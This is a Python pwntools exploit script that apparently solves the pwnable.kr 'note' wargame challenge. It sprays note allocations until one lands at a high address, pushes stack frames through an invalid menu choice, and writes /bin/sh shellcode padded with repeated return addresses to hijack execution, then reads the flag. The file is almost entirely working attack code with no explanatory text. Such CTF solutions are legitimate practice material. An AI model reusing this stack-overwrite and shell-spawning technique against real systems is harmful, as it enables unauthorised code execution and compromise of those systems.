#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9019 ./note
import os

os.environ["PWNLIB_NOTERM"] = "1"
os.environ["PWNLIB_COLOR"] = "always"

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./note")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "localhost"
port = int(args.PORT or 9019)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

import enum

STACK_FRAME_SIZE = 0x428 + 4 + 4


class MenuChoice(enum.IntEnum):
    CREATE_NOTE = 1
    WRITE_NOTE = 2
    READ_NOTE = 3
    DELETE_NOTE = 4
    EXIT = 5
    INVALID = 6
    HACKER_SECRET_MENU = 0x31337


def do_menu(choice):
    io.sendlineafter(b"5. exit\n", str(choice.value).encode())


def skip_start():
    io.recvuntil(b"I think security people will thank me for this :)\n\n")


def create_note():
    do_menu(MenuChoice.CREATE_NOTE)

    io.recvuntil(b"note created. no ")

    id_ = int(io.recvline(keepends=False))

    io.recv(2)

    addr = int(io.recvuntil(b"]", drop=True), 16)

    return id_, addr


def delete_note(id_):
    do_menu(MenuChoice.DELETE_NOTE)

    io.sendlineafter(b"note no?\n", str(id_).encode())


def write_note(id_, data):
    do_menu(MenuChoice.WRITE_NOTE)

    io.sendlineafter(b"note no?\n", str(id_).encode())
    io.sendlineafter(b"paste your note (MAX : 4096 byte)\n", data)


def bye():
    do_menu(MenuChoice.EXIT)

    io.recvline()


def alloc_stack_frame(data = b""):
    do_menu(MenuChoice.INVALID)


io = start()

skip_start()

with log.progress("allocating pages") as p:
    for count in range(1024):
        p.status(str(count))

        id_, addr = create_note()

        if addr > 0xffe65000:
            break

        delete_note(id_)
    else:
        raise Exception("failed to allocate page")

log.success("allocated page at 0x{addr:x} after {count} tries".format(addr=addr, count=count))

with log.progress("allocating stack frames") as p:
    for i in range(1024 - count):
        p.status(str(i))
        alloc_stack_frame()

write_note(0, asm(shellcraft.sh()) + p32(addr) * 1500)

bye()

io.sendline(b"cat flag")
log.success("flag = '{}'".format(term.text.bold_italic_yellow(io.recvline().decode().strip())))
